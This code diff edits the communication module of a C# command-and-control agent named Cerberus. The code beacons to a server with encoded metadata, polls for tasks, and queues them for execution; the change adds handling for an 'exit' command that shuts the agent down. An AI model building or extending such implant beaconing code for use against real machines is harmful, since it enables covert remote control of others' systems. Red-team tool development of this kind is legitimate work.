@@ -19,6 +19,7 @@ namespace Cerberus.Models.CommModule
         public string HostHeader { get; set; }
         public int SleepTime { get; set; }
         public string CallbackUUID { get; set; }
+        public bool Exit { get; set; } = false;
         public CerberusMetadata Metadata { get; set; }
 
         private CancellationTokenSource _cancellationTokenSource;
@@ -84,9 +85,11 @@ namespace Cerberus.Models.CommModule
                 // Sleep
                 await Task.Delay(SleepTime);
             }
+
+            Environment.Exit(0);
         }
 
-        private async Task InitCheckin()
+        public override async Task InitCheckin()
         {
             var encodedMetadata = Convert.ToBase64String(Metadata.Serialize());
             var encodedUUID = Convert.ToBase64String(Encoding.UTF8.GetBytes(PayloadUUID));
@@ -127,6 +130,8 @@ namespace Cerberus.Models.CommModule
 
         private async Task SendTaskingResponse()
         {
+            // Check to see if any result is exit
+
             var outbound = GetOutbound();
             var taskingResponse = new PostTaskingRequest
             {
@@ -139,6 +144,11 @@ namespace Cerberus.Models.CommModule
             var content = new StringContent(Convert.ToBase64String(Encoding.UTF8.GetBytes(CallbackUUID)) + encodedJson);
             var response = await _httpClient.PostAsync(URI, content);
             var responseContent = await response.Content.ReadAsStringAsync();
+
+            if (Exit)
+            {
+                Stop();
+            }
 
             HandlePostResponse(responseContent);
         }
@@ -155,6 +165,12 @@ namespace Cerberus.Models.CommModule
                 foreach (var task in tasks)
                 {
                     Inbound.Enqueue(task);
+
+                    // If command is exit, the command gets queued so we can still get output from it, and then the token source is canceled so no new tasks will be queued
+                    if (task.command.Equals("exit"))
+                    {
+                        Exit = true;
+                    }
                 }
             }
         }
@@ -176,11 +192,6 @@ namespace Cerberus.Models.CommModule
         public override void Stop()
         {
             _cancellationTokenSource.Cancel();
-        }
-
-        public override Task InitialCheckin()
-        {
-            throw new NotImplementedException();
         }
     }
 }
